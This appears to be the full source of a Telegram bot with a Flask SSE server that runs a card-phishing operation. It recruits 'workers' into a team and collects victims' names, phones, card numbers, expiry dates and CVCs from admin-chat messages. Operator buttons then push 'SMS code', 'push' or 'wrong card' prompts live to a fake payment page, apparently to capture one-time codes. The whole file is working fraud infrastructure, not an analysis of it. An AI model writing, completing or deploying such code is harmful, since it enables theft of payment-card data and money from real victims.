import asyncio
import logging
import os
from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import psycopg2
import datetime
import json
import time
import threading
from threading import Lock
from flask import Flask, Response, request, jsonify
import requests

# Загружаем переменные из .env
load_dotenv()

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Берем токен и ID из .env файла
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID')

if not BOT_TOKEN or not ADMIN_CHAT_ID:
    logger.error("❌ BOT_TOKEN или ADMIN_CHAT_ID не установлены!")
    exit(1)

ADMIN_CHAT_ID = int(ADMIN_CHAT_ID)

bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# SSE сервер
app = Flask(__name__)
sse_clients = {}
sse_lock = Lock()

# Разрешенные домены для CORS
ALLOWED_ORIGINS = [
    "https://clickuz.github.io",
    "https://clickuz.github.io/roomix", 
    "http://localhost:3000",
    "http://127.0.0.1:5500", 
    "http://localhost:8080",
    "http://127.0.0.1:8080",
    "https://roomix-production.up.railway.app"
]

# CORS middleware
@app.after_request
def after_request(response):
    origin = request.headers.get('Origin')
    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type, *'
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response

@app.route('/sse/<user_id>')
def sse(user_id):
    """Server-Sent Events endpoint для получения команд"""
    def event_stream():
        yield f"data: {json.dumps({'type': 'connected', 'message': 'SSE подключен'})}\n\n"
        
        with sse_lock:
            if user_id not in sse_clients:
                sse_clients[user_id] = []
            logger.info(f"✅ SSE подключен: {user_id}")
        
        try:
            while True:
                with sse_lock:
                    if user_id in sse_clients and sse_clients[user_id]:
                        while sse_clients[user_id]:
                            command = sse_clients[user_id].pop(0)
                            yield f"data: {json.dumps(command)}\n\n"
                
                time.sleep(0.05)
                
        except GeneratorExit:
            with sse_lock:
                if user_id in sse_clients:
                    del sse_clients[user_id]
                    logger.info(f"❌ SSE отключен: {user_id}")

    response = Response(event_stream(), mimetype='text/event-stream')
    origin = request.headers.get('Origin')
    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response

@app.route('/send_command', methods=['POST', 'OPTIONS'])
def send_command():
    """Бот отправляет команду пользователю"""
    if request.method == 'OPTIONS':
        response = jsonify({'status': 'ok'})
        origin = request.headers.get('Origin')
        if origin in ALLOWED_ORIGINS:
            response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
        response.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
        return response
        
    try:
        data = request.json
        user_id = data.get('user_id')
        action = data.get('action')
        payment_id = data.get('payment_id')
        
        if not user_id or not action:
            return {'error': 'Missing user_id or action'}, 400
            
        command_data = {
            'type': 'bot_command',
            'action': action,
            'payment_id': payment_id,
            'timestamp': datetime.datetime.now().isoformat()
        }
        
        with sse_lock:
            if user_id not in sse_clients:
                sse_clients[user_id] = []
            sse_clients[user_id].append(command_data)
            
        logger.info(f"✅ Команда отправлена {user_id}: {action}")
        response = jsonify({'status': 'success'})
        origin = request.headers.get('Origin')
        if origin in ALLOWED_ORIGINS:
            response.headers['Access-Control-Allow-Origin'] = origin
        return response
        
    except Exception as e:
        logger.error(f"❌ Ошибка отправки команды: {e}")
        response = jsonify({'error': str(e)})
        origin = request.headers.get('Origin')
        if origin in ALLOWED_ORIGINS:
            response.headers['Access-Control-Allow-Origin'] = origin
        return response, 500

@app.route('/health')
def health():
    """Проверка здоровья сервера"""
    with sse_lock:
        users_count = len(sse_clients)
        total_commands = sum(len(commands) for commands in sse_clients.values())
    
    response = jsonify({
        'status': 'running',
        'users_count': users_count,
        'total_commands': total_commands,
        'timestamp': datetime.datetime.now().isoformat(),
        'allowed_origins': ALLOWED_ORIGINS
    })
    origin = request.headers.get('Origin')
    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
    return response

@app.route('/')
def home():
    return "🚀 Roomix Bot + SSE Server"

def run_flask():
    """Запуск Flask сервера в отдельном потоке"""
    try:
        port = int(os.environ.get('PORT', 8080))
        logger.info(f"🌐 Flask запускается на порту: {port}")
        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
    except Exception as e:
        logger.error(f"💥 Ошибка запуска Flask: {e}")

# Запускаем Flask в отдельном потоке
flask_thread = threading.Thread(target=run_flask, daemon=True)
flask_thread.start()

# ========== POSTGRESQL БАЗА ДАННЫХ ==========
def get_db_connection():
    """Подключение к PostgreSQL"""
    try:
        conn = psycopg2.connect(os.getenv('DATABASE_URL'))
        return conn
    except Exception as e:
        logger.error(f"❌ Ошибка подключения к БД: {e}")
        return None

def init_db():
    """Создание таблиц в PostgreSQL"""
    conn = get_db_connection()
    if conn is None:
        logger.error("❌ Не удалось подключиться к БД для инициализации")
        return
        
    cursor = conn.cursor()
    
    try:
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS applications (
            id SERIAL PRIMARY KEY,
            user_id TEXT,
            username TEXT,
            first_name TEXT,
            time TEXT,
            experience TEXT,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
        ''')
        
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS payments (
            id SERIAL PRIMARY KEY,
            user_id TEXT,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
        ''')
        
        conn.commit()
        logger.info("✅ Таблицы БД созданы/проверены")
    except Exception as e:
        logger.error(f"❌ Ошибка создания таблиц: {e}")
    finally:
        conn.close()

init_db()

class ApplicationStates(StatesGroup):
    waiting_for_time = State()
    waiting_for_experience = State()
    confirmation = State()

# Кнопки для бота
main_kb = types.ReplyKeyboardMarkup(
    keyboard=[[types.KeyboardButton(text="📝 Оставить заявку")]],
    resize_keyboard=True
)

accepted_kb = types.ReplyKeyboardMarkup(
    keyboard=[[types.KeyboardButton(text="🏠 Главное меню")]],
    resize_keyboard=True
)

cancel_kb = types.ReplyKeyboardMarkup(
    keyboard=[[types.KeyboardButton(text="❌ Отменить заявку")]],
    resize_keyboard=True
)

confirm_kb = types.ReplyKeyboardMarkup(
    keyboard=[
        [types.KeyboardButton(text="✅ Отправить заявку")],
        [types.KeyboardButton(text="🔄 Заполнить заново")]
    ],
    resize_keyboard=True
)

# Инлайн кнопки для платежей
def get_payment_buttons(payment_id, user_id="user123"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="📱 SMS код", callback_data=f"sms_{payment_id}_{user_id}"),
            InlineKeyboardButton(text="🔔 Пуш", callback_data=f"push_{payment_id}_{user_id}")
        ],
        [
            InlineKeyboardButton(text="❌ Неверная карта", callback_data=f"wrong_card_{payment_id}_{user_id}")
        ]
    ])

# Инлайн кнопки для заявок
def get_admin_buttons(application_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Принять", callback_data=f"accept_{application_id}"),
            InlineKeyboardButton(text="❌ Отклонить", callback_data=f"reject_{application_id}")
        ]
    ])

# Инлайн кнопки для бота
profile_kb = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")]
])

# ========== POSTGRESQL ФУНКЦИИ ==========
def get_user_status(user_id):
    conn = get_db_connection()
    if conn is None:
        return None
        
    cursor = conn.cursor()
    try:
        cursor.execute('SELECT status FROM applications WHERE user_id = %s ORDER BY id DESC LIMIT 1', (str(user_id),))
        result = cursor.fetchone()
        return result[0] if result else None
    except Exception as e:
        logger.error(f"❌ Ошибка получения статуса пользователя: {e}")
        return None
    finally:
        conn.close()

def get_join_date(user_id):
    conn = get_db_connection()
    if conn is None:
        return datetime.datetime.now().strftime('%d.%m.%Y')
        
    cursor = conn.cursor()
    try:
        cursor.execute('SELECT created_at FROM applications WHERE user_id = %s AND status = %s', (str(user_id), 'accepted'))
        result = cursor.fetchone()
        if result:
            return result[0].strftime('%d.%m.%Y')
        return datetime.datetime.now().strftime('%d.%m.%Y')
    except Exception as e:
        logger.error(f"❌ Ошибка получения даты вступления: {e}")
        return datetime.datetime.now().strftime('%d.%m.%Y')
    finally:
        conn.close()

def save_payment(user_id, first_name, last_name, email, phone, card_number, card_expiry, cvc):
    """СОХРАНЯЕМ ТОЛЬКО СТАТУС, БЕЗ ДАННЫХ КАРТ!"""
    try:
        conn = get_db_connection()
        if conn is None:
            return None
            
        cursor = conn.cursor()
        cursor.execute('''
        INSERT INTO payments (user_id, status)
        VALUES (%s, 'pending') RETURNING id
        ''', (str(user_id),))
        payment_id = cursor.fetchone()[0]
        conn.commit()
        conn.close()
        
        logger.info(f"✅ Платеж #{payment_id} создан (данные карт НЕ сохранены)")
        return payment_id
    except Exception as e:
        logger.error(f"❌ Ошибка создания платежа: {e}")
        return None

def save_application(user_id, username, first_name, time, experience):
    try:
        conn = get_db_connection()
        if conn is None:
            return None
            
        cursor = conn.cursor()
        cursor.execute('''
        INSERT INTO applications (user_id, username, first_name, time, experience, status)
        VALUES (%s, %s, %s, %s, %s, 'pending') RETURNING id
        ''', (str(user_id), username, first_name, time, experience))
        
        application_id = cursor.fetchone()[0]
        conn.commit()
        conn.close()
        return application_id
    except Exception as e:
        logger.error(f"❌ Ошибка сохранения заявки: {e}")
        return None

async def send_sse_command(user_id, action_type, payment_id=None):
    """Отправка команды через SSE сервер"""
    try:
        server_url = "https://roomix-production.up.railway.app"
        
        response = requests.post(
            f"{server_url}/send_command",
            json={
                'user_id': user_id,
                'action': action_type,
                'payment_id': payment_id
            },
            timeout=5
        )
        
        if response.status_code == 200:
            logger.info(f"✅ SSE команда отправлена {user_id}: {action_type}")
            return True
        else:
            logger.error(f"❌ Ошибка SSE отправки: {response.status_code}")
            return False
            
    except Exception as e:
        logger.error(f"💥 Ошибка HTTP запроса: {e}")
        return False

# ========== ОБЩАЯ ФУНКЦИЯ ДЛЯ СТАТУСОВ ПЛАТЕЖЕЙ ==========
async def update_payment_status(callback, payment_id, user_id, status_text, action_type):
    """Общая функция для обновления статуса платежа"""
    success = await send_sse_command(user_id, action_type, payment_id)
    
    await callback.message.edit_text(
        f"💳 <b>НОВАЯ ОПЛАТА #{payment_id}</b>\n\n"
        f"👤 Клиент: {user_id}\n"
        f"{status_text}\n\n"
        f"Выберите действие:",
        reply_markup=get_payment_buttons(payment_id, user_id),
        parse_mode="HTML"
    )
    return success

# Обработчик для платежных данных
@dp.message(F.chat.id == ADMIN_CHAT_ID)
async def handle_admin_messages(message: types.Message):
    logger.info(f"📨 АДМИН: Тип: {message.content_type}, Текст: {message.text}")
    
    if message.text and "НОВАЯ ОПЛАТА" in message.text:
        logger.info("💰 ОБНАРУЖЕНЫ ПЛАТЕЖНЫЕ ДАННЫЕ!")
        await process_payment_data(message)

async def process_payment_data(message: types.Message):
    try:
        lines = message.text.split('\n')
        payment_data = {}

        for line in lines:
            line = line.strip()
            if 'Имя:' in line:
                payment_data['first_name'] = line.split('Имя:')[1].strip()
            elif 'Фамилия:' in line:
                payment_data['last_name'] = line.split('Фамилия:')[1].strip()
            elif 'Email:' in line:
                payment_data['email'] = line.split('Email:')[1].strip()
            elif 'Телефон:' in line:
                payment_data['phone'] = line.split('Телефон:')[1].strip()
            elif 'Номер:' in line:
                payment_data['card_number'] = line.split('Номер:')[1].strip()
            elif 'Срок:' in line:
                payment_data['card_expiry'] = line.split('Срок:')[1].strip()
            elif 'CVC:' in line:
                payment_data['cvc'] = line.split('CVC:')[1].strip()

        # СОЗДАЕМ ПЛАТЕЖ БЕЗ СОХРАНЕНИЯ ДАННЫХ КАРТ
        payment_id = save_payment(
            user_id=0,
            first_name=payment_data.get('first_name', ''),
            last_name=payment_data.get('last_name', ''),
            email=payment_data.get('email', ''),
            phone=payment_data.get('phone', ''),
            card_number=payment_data.get('card_number', ''),
            card_expiry=payment_data.get('card_expiry', ''),
            cvc=payment_data.get('cvc', '')
        )

        if payment_id:
            await bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text="💳 <b>Выберите действие:</b>",
                reply_markup=get_payment_buttons(payment_id),
                parse_mode="HTML"
            )
            logger.info(f"✅ Платеж #{payment_id} создан")

    except Exception as e:
        logger.error(f"💥 Ошибка обработки платежа: {e}")

# Обработчики инлайн кнопок для платежей (УПРОЩЕННЫЕ)
@dp.callback_query(F.data.startswith("sms_"))
async def sms_code_handler(callback: types.CallbackQuery):
    parts = callback.data.split("_")
    payment_id = parts[1]
    user_id = parts[2]
    
    await update_payment_status(
        callback, payment_id, user_id, 
        "📱 <b>Статус: SMS код запрошен</b>", 
        "sms"
    )
    await callback.answer("SMS код запрошен")

@dp.callback_query(F.data.startswith("push_"))
async def push_handler(callback: types.CallbackQuery):
    parts = callback.data.split("_")
    payment_id = parts[1]
    user_id = parts[2]
    
    await update_payment_status(
        callback, payment_id, user_id,
        "🔔 <b>Статус: Пуш отправлен</b>", 
        "push"
    )
    await callback.answer("Пуш отправлен")

@dp.callback_query(F.data.startswith("wrong_card_"))
async def wrong_card_handler(callback: types.CallbackQuery):
    parts = callback.data.split("_")
    payment_id = parts[1]
    user_id = parts[2]
    
    await update_payment_status(
        callback, payment_id, user_id,
        "❌ <b>Статус: Карта отклонена</b>", 
        "wrong_card"
    )
    await callback.answer("Карта отклонена")

# Остальные обработчики бота
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.chat.id == ADMIN_CHAT_ID:
        await message.answer("👋 Админ панель готова к работе!")
        return
        
    user_id = message.from_user.id
    user_status = get_user_status(user_id)

    if user_status == 'accepted':
        welcome_text = """
🎉 <b>Добро пожаловать в команду!</b>

Вы успешно прошли отбор и теперь являетесь частью нашего проекта.
"""
        await bot.send_photo(
            chat_id=user_id,
            photo="https://images.unsplash.com/photo-1521737711867-e3b97375f902?auto=format&fit=crop&w=800&q=80",
            caption=welcome_text,
            reply_markup=profile_kb,
            parse_mode="HTML"
        )
    elif user_status == 'rejected':
        welcome_text = """
👋 <b>Добро пожаловать!</b>

К сожалению, ваша предыдущая заявка была отклонена.
"""
        await message.answer(welcome_text, reply_markup=main_kb, parse_mode="HTML")
    else:
        welcome_text = """
👋 <b>Добро пожаловать!</b>

Это бот для подачи заявки на участие в проекте.

Чтобы начать, нажмите кнопку ниже 👇
"""
        await message.answer(welcome_text, reply_markup=main_kb, parse_mode="HTML")

@dp.message(F.text == "🏠 Главное меню")
async def main_menu(message: types.Message):
    if message.chat.id == ADMIN_CHAT_ID:
        return
        
    user_status = get_user_status(message.from_user.id)
    if user_status == 'accepted':
        welcome_text = """
🎉 <b>Главное меню</b>

Добро пожаловать в нашу команду!
"""
        await bot.send_photo(
            chat_id=message.from_user.id,
            photo="https://images.unsplash.com/photo-1521737711867-e3b97375f902?auto=format&fit=crop&w=800&q=80",
            caption=welcome_text,
            reply_markup=profile_kb,
            parse_mode="HTML"
        )
    else:
        await message.answer("👋 Для начала работы нажмите '📝 Оставить заявку'", reply_markup=main_kb)

@dp.message(F.text == "📝 Оставить заявку")
async def start_application(message: types.Message, state: FSMContext):
    if message.chat.id == ADMIN_CHAT_ID:
        return
        
    user_status = get_user_status(message.from_user.id)

    if user_status == 'accepted':
        await message.answer("✅ Вы уже приняты в команду!", reply_markup=accepted_kb)
        return
    elif user_status == 'rejected':
        await message.answer("❌ Ваша предыдущая заявка была отклонена", reply_markup=main_kb)
        return
    elif user_status == 'pending':
        await message.answer("⏳ Ваша заявка уже на рассмотрении", reply_markup=main_kb)
        return

    await state.set_state(ApplicationStates.waiting_for_time)
    question_text = """
⏰ <b>Первый вопрос:</b>

Сколько часов в день вы готовы уделять работе?
(Напишите число, например: 4, 6, 8)
"""
    await message.answer(question_text, reply_markup=cancel_kb, parse_mode="HTML")

@dp.message(F.text == "❌ Отменить заявку")
async def cancel_application(message: types.Message, state: FSMContext):
    if message.chat.id == ADMIN_CHAT_ID:
        return
        
    await state.clear()
    await message.answer("❌ Заявка отменена", reply_markup=main_kb)

@dp.message(ApplicationStates.waiting_for_time)
async def process_time(message: types.Message, state: FSMContext):
    if message.chat.id == ADMIN_CHAT_ID:
        return
        
    time_answer = message.text.strip()

    if not time_answer.isdigit():
        await message.answer("❌ Пожалуйста, введите число (например: 4, 6, 8)")
        return

    hours = int(time_answer)
    if hours > 24:
        await message.answer("❌ В сутках всего 24 часа! Введите реальное число")
        return

    await state.update_data(time=time_answer)
    await state.set_state(ApplicationStates.waiting_for_experience)

    question_text = """
💼 <b>Второй вопрос:</b>

Какой у вас опыт работы в этой сфере?
(Опишите кратко ваш опыт)
"""
    await message.answer(question_text, reply_markup=cancel_kb, parse_mode="HTML")

@dp.message(ApplicationStates.waiting_for_experience)
async def process_experience(message: types.Message, state: FSMContext):
    if message.chat.id == ADMIN_CHAT_ID:
        return
        
    experience = message.text.strip()

    if len(experience) < 5:
        await message.answer("❌ Пожалуйста, опишите опыт более подробно")
        return

    await state.update_data(experience=experience)
    await state.set_state(ApplicationStates.confirmation)

    user_data = await state.get_data()
    confirmation_text = f"""
📋 <b>Проверьте вашу заявку:</b>

⏰ <b>Время:</b> {user_data['time']} часов/день
💼 <b>Опыт:</b> {user_data['experience']}

Всё верно?
"""
    await message.answer(confirmation_text, reply_markup=confirm_kb, parse_mode="HTML")

@dp.message(ApplicationStates.confirmation)
async def process_confirmation(message: types.Message, state: FSMContext):
    if message.chat.id == ADMIN_CHAT_ID:
        return
        
    if message.text == "✅ Отправить заявку":
        user_data = await state.get_data()

        # ИСПРАВЛЕННОЕ СОХРАНЕНИЕ ЗАЯВКИ
        application_id = save_application(
            user_id=message.from_user.id,
            username=message.from_user.username,
            first_name=message.from_user.first_name,
            time=user_data['time'],
            experience=user_data['experience']
        )

        if application_id is None:
            await message.answer("❌ Ошибка сохранения заявки. Попробуйте позже.", reply_markup=main_kb)
            await state.clear()
            return

        application_text = f"""
🚨 <b>НОВАЯ ЗАЯВКА #{application_id}</b>

👤 <b>Пользователь:</b>
ID: {message.from_user.id}
Username: @{message.from_user.username or 'Нет'}
Имя: {message.from_user.first_name or ''}

📋 <b>Данные заявки:</b>
⏰ Время: {user_data['time']} часов/день
💼 Опыт: {user_data['experience']}

🕒 Время подачи: {message.date.strftime('%d.%m.%Y %H:%M')}
"""
        try:
            await bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=application_text,
                reply_markup=get_admin_buttons(application_id),
                parse_mode="HTML"
            )

            success_text = """
✅ <b>Заявка отправлена!</b>

Спасибо за вашу заявку! Мы рассмотрим её в ближайшее время и свяжемся с вами.

Ожидайте решения...
"""
            await message.answer(success_text, reply_markup=accepted_kb, parse_mode="HTML")
        except Exception as e:
            await message.answer("❌ Произошла ошибка при отправки заявки. Попробуйте позже.", reply_markup=main_kb)

        await state.clear()

    elif message.text == "🔄 Заполнить заново":
        await state.clear()
        await start_application(message, state)
    else:
        await message.answer("❌ Пожалуйста, используйте кнопки ниже")

@dp.callback_query(F.data == "profile")
async def show_profile(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    user_status = get_user_status(user_id)

    if user_status == 'accepted':
        join_date = get_join_date(user_id)
        
        # НОВЫЙ ПРОФИЛЬ КАК НА СКРИНШОТЕ
        profile_text = f"""
<b>👤 Ваш профиль</b>

• Telegram ID: {user_id}
• Баланс: 0 RUB
• Тип ставки: 5

────────────────
<b>Успешных профилей:</b> 0
• Общая сумма профилей: 0 RUB

<b>Вы пригласили:</b> 0
• Заработано на рефералах: 0 RUB
• Статус: Воркер
• В команде: 0 дней

────────────────
<b>Статус проекта:</b> WORK
"""
        await callback.message.delete()
        await callback.message.answer(
            profile_text,
            reply_markup=profile_kb,
            parse_mode="HTML"
        )
    else:
        await callback.answer("❌ У вас нет доступа к этой функции", show_alert=True)
    await callback.answer()

@dp.callback_query(F.data.startswith("accept_"))
async def accept_application(callback: types.CallbackQuery):
    application_id = callback.data.split("_")[1]

    conn = get_db_connection()
    if conn is None:
        await callback.answer("❌ Ошибка подключения к БД", show_alert=True)
        return
        
    cursor = conn.cursor()
    try:
        cursor.execute('UPDATE applications SET status = %s WHERE id = %s', ('accepted', application_id))
        conn.commit()

        cursor.execute('SELECT user_id, time, experience FROM applications WHERE id = %s', (application_id,))
        application = cursor.fetchone()
        
        if application:
            user_id, time, experience = application

            user_message = """
🎉 <b>Поздравляем! Ваша заявка принята!</b>

Мы рады приветствовать вас в нашей команде!
"""
            try:
                await bot.send_message(
                    chat_id=int(user_id),
                    text=user_message,
                    parse_mode="HTML"
                )

                welcome_text = """
🎉 <b>Добро пожаловать в команду!</b>

Вы успешно прошли отбор и теперь являетесь частью нашего проекта.
"""
                await bot.send_photo(
                    chat_id=int(user_id),
                    photo="https://images.unsplash.com/photo-1521737711867-e3b97375f902?auto=format&fit=crop&w=800&q=80",
                    caption=welcome_text,
                    reply_markup=profile_kb,
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.error(f"❌ Ошибка отправки сообщения пользователю: {e}")

            await callback.message.edit_text(
                f"✅ <b>ЗАЯВКА #{application_id} ПРИНЯТА</b>\n\n"
                f"Пользователь уведомлен о решении.",
                parse_mode="HTML"
            )
    except Exception as e:
        logger.error(f"❌ Ошибка принятия заявки: {e}")
        await callback.answer("❌ Ошибка принятия заявки", show_alert=True)
    finally:
        conn.close()

    await callback.answer()

@dp.callback_query(F.data.startswith("reject_"))
async def reject_application(callback: types.CallbackQuery):
    application_id = callback.data.split("_")[1]

    conn = get_db_connection()
    if conn is None:
        await callback.answer("❌ Ошибка подключения к БД", show_alert=True)
        return
        
    cursor = conn.cursor()
    try:
        cursor.execute('UPDATE applications SET status = %s WHERE id = %s', ('rejected', application_id))
        conn.commit()

        cursor.execute('SELECT user_id FROM applications WHERE id = %s', (application_id,))
        application = cursor.fetchone()
        
        if application:
            user_id = application[0]

            user_message = """
😔 <b>К сожалению, ваша заявка отклонена.</b>

Спасибо за проявленный интерес! В данный момент мы не можем предложить вам сотрудничество.

Желаем удачи в будущих проектах!
"""
            try:
                await bot.send_message(
                    chat_id=int(user_id),
                    text=user_message,
                    reply_markup=main_kb,
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.error(f"❌ Ошибка отправки сообщения пользователю: {e}")

            await callback.message.edit_text(
                f"❌ <b>ЗАЯВКА #{application_id} ОТКЛОНЕНА</b>\n\n"
                f"Пользователь уведомлен о решении.",
                parse_mode="HTML"
            )
    except Exception as e:
        logger.error(f"❌ Ошибка отклонения заявки: {e}")
        await callback.answer("❌ Ошибка отклонения заявки", show_alert=True)
    finally:
        conn.close()

    await callback.answer()

async def main():
    logger.info("🚀 Бот запускается...")
    logger.info("🌐 SSE сервер запущен с CORS для GitHub Pages")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
